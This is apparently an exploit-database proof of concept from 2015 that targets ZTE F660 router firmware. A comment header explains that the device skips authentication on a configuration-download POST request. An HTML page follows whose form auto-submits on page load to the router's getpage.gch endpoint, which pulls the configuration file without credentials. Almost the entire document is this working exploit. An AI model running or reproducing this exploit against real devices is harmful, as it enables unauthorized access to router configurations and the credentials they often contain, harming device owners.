/*
Exploit Title   : ZTE remote configuration download
Date            : 09 May 2015
Exploit Author  : Daniel Cisa
Vendor Homepage : http://wwwen.zte.com.cn/en/
Platform        : Hardware
Tested On       : ZTE F660
Firmware Version: 2.22.21P1T8S
--------------------------
 Config remote download
--------------------------
ZTE F660 Embedded Software does not check Cookies And Credentials on POST
method so
attackers could download the config file with this post method without
authentication.

*/
<html>
<body onload="document.fDownload.submit();">
<form name="fDownload" method="POST" action="
http://192.168.1.1/getpage.gch?pid=101&nextpage=manager_dev_config_t.gch"
enctype="multipart/form-data" onsubmit="return false;">
Request Sent....
<input type="hidden" name="config" id="config" value="">
</body>
</html>